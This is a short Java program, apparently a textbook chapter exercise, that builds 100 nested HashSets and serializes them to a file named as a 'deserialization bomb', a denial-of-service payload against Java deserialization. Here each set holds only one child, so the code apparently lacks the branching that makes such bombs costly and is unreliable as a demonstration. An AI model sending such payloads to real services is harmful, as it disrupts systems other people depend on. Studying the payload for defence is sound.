package Cap12;


import java.io.*;
import java.util.HashSet;

public class DeserializationBomb {
    public static void main(String[] args) throws Exception {
        HashSet<Object> root = new HashSet<>();
        HashSet<Object> s1 = root;
        HashSet<Object> s2;

        for (int i = 0; i < 100; i++) {
            s2 = new HashSet<>();
            s1.add(s2);
            s1 = s2;
        }

        try (ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("bomb.ser"))) {
            out.writeObject(root);
        }
    }
}

